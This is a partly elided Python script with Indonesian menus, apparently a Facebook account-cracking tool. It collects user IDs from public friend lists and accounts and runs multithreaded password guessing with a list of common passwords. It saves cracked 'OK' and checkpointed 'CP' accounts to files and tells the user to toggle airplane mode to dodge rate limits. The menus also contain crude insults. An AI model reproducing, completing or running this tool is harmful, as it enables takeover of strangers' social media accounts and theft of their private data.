...
def login_lagi():
	...
	sky2 = mark(sky, style='purple')
	sol().print(sky2, style='purple')
...
def menu(my_name,my_id,my_birthday):
	...
	sol().print(fx)
	print(x+'['+h+'•'+x+'] \x1b[0;34mNama Lo           : '+str(my_name))
	print(x+'['+h+'•'+x+'] \x1b[1;92mIni ID Lo         : '+str(my_id))
	print(x+'['+h+'•'+x+'] \33[1;96mTanggal Lo        : '+str(birth))
	print(x+'['+h+'•'+x+'] \x1b[0;34mIp hp Lo          : '+str(sh['origin']))
	io = '\x1b[1;92m[01] Ambil ID Dari Pertemanan Publik\n\x1b[0;34m[02] Ambil ID Dari Akun Publik (terserah) \n\33[1;96m[03] Cek Hasil Crack\n\x1b[0;34m[04] Lihat Opsi Checkpoint\n\33[1;96m[00] Keluar'
	...
	if jh in ['1','01']:
		...
		ric = '# PILIH YANG BENER LAH GOBLOK'
...
def result():
	...
	kayes = '\x1b[0;34m[01] Cek Hasil Cp\n\x1b[1;92m[02] Cek Hasil Ok\n\33[1;96m[00] Kembali Ke Menu'
	kis = nel(kayes, style='blue')
	...
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
			...
			sol().print(mark(gada, style='blue'))
			time.sleep(2)
			back()
		if len(vin)==0:
		...
		if len(vin)==0:
			...
			sol().print(mark(haha, style='blue'))
			time.sleep(2)
			back()
		else:
			gerr = '# HASIL OK ANDA'
...
def setting():
	...
	teks = '\x1b[0;34m[01] Crack Dari Akun Tertua (Mantap)\n\33[1;96m[02] Crack Dari Akun Termuda (Mantap Dikit)\n\x1b[1;92m[03] Acak Urutan ID'
	...
	ioz = '\x1b[0;34m[01] Method B-Api (Cepat)\n\33[1;96m[02] Method Mobile (Lambat Hasil OK)\n\x1b[1;92m[03] Methode Free Facebook (Sangat Lambat)'
...
# WORDLIST
def passwrd():
	ler = '# SEDANG MENCOLI TANPA BATAS, TEKAN CTRL+Z UNTUK BERHENTI'
	sol().print(mark(ler, style='red'))
	krek = '\x1b[0;34mHasil Live  Disimpan Ke : OK/%s\n\x1b[1;92mHasil Check Disimpan Ke : CP/%s\n\33[1;96mHidupkan/Matikan Mode Pesawat Setiap 5 Menit'%(okc,cpc)
	cetak(nel(krek, title='TUNGGU AJA'))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['sayang','sayangku','sayang123','bismillah','anjing','katasandi','sandi123','kontol','ngentod','bajingan']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s •Itodori• %s/%s ME OK:%s 🖤 CP:%s YOU %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
...
def crack2(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s •Itodori• %s/%s ••• ok*%s ••• cp*%s ••• %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
